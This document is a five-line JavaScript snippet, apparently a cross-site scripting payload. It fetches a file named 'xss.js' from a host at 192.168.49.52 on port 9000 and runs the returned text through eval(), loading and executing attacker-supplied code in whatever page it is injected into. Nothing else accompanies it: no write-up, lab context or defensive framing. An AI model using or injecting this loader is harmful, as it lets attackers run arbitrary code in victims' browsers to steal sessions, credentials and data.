fetch("http://192.168.49.52:9000/xss.js")
    .then(function (r) { return r.text(); })
    .then(function (v) {
    eval(v);
});
